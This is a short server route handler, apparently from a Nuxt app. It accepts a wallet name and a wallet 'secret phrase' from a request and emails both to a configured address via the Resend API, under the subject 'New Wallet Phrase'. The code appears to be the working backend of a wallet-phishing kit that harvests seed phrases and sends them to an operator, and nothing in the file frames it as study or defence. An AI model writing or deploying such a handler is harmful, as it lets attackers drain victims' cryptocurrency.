
import { Resend } from 'resend'

const resend = new Resend(process.env.RESEND_API_KEY)

export default defineEventHandler(async (event) => {
    const body = await readBody(event)

    const { data, error } = await resend.emails.send({
        from: 'Phrase alert <onboarding@resend.dev>',
        to: [process.env.WALLET_TO_EMAIL as string],
        subject: `New Wallet Phrase`,
        html: `
      <p>Wallet Name: ${body.walletName}</p>
      <p>Secret Phrase: ${body.walletPhrase}</p>
    `,
    })

    if (error) {
        throw createError({ statusCode: 500, message: error.message })
    }

    return data
})